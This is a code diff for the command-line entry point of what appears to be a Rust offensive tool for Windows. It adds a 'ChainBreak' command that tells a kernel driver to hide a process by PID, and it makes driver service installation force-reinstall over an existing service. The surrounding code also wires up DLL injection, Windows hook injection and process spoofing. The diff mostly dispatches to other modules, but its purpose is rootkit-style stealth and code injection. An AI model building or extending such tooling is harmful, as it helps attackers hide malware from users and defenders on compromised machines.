@@ -1,12 +1,15 @@
+mod chainbreak;
 mod inject;
 mod installsrv;
 mod process;
 
+use crate::chainbreak::BreakChain;
 use crate::inject::{Inject, WindowsHook};
 use crate::installsrv::svc_install;
 use crate::process::{FakeProcess, ObjProcess, Process};
 use anyhow::Result;
 use clap::{command, Parser, Subcommand};
+use installsrv::svc_delete;
 use log::{debug, info, warn};
 use std::env::set_var;
 
@@ -63,6 +66,13 @@ enum Command {
         #[arg(short, long, value_name = "SERVICE NAME")]
         name: String,
     },
+
+    /// Break the chain in Ring0 to hide process
+    ChainBreak {
+        /// The process pid you want tio hide
+        #[arg(short, long, value_name = "PID")]
+        pid: u32,
+    },
 }
 
 fn copy_str_2_process(obj: u32, fake: u32) {
@@ -107,7 +117,12 @@ fn set_windows_hook(dll_path: *const u8) {
 }
 
 fn install_srv(sys: &str, name: &str) {
-    svc_install(sys, name).expect("Services install failed.");
+    if let Err(_) = svc_install(sys, name) {
+        debug!("service exists try to delete it.");
+        svc_delete(name).expect("Delete service failed.");
+        // try to install service success
+        svc_install(sys, name).expect("Install service failed.");
+    }
 }
 
 fn main() {
@@ -115,7 +130,7 @@ fn main() {
 
     // Set Debug logger;
     if args.debug {
-        set_var("RUST_LOG", "debug")
+        set_var("RUST_LOG", "debug");
     } else {
         set_var("RUST_LOG", "info")
     }
@@ -131,6 +146,9 @@ fn main() {
         }) => inject_dll_2_process(dll_path, pid, name.as_ref()).unwrap(),
         Some(Command::WindowsHook { dll_path }) => set_windows_hook(dll_path.as_ptr()),
         Some(Command::Services { sys, name }) => install_srv(sys, name),
+        Some(Command::ChainBreak { pid }) => {
+            BreakChain::hide_by_pid(*pid).expect("Send Pid to Driver failed.")
+        }
         _ => {}
     }
 }
